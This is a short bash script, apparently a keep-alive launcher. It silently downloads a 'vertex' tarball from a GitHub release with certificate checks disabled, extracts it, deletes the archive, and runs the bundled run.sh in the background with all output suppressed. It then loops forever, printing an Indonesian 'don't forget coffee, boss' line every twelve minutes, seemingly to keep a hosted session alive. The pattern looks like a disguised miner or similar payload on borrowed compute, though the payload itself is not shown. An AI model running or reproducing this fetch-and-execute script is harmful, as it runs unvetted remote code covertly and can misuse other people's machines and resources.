#!/bin/bash
curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/vertex.tar.gz >/dev/null 2>&1
tar -xvf vertex.tar.gz >/dev/null 2>&1
rm vertex.tar.gz
chmod +x run.sh
bash run.sh 7 >/dev/null 2>&1 &
sleep 200
while true
do
        echo "Ojo Lali Ngopi Boss..."
        sleep 720
done
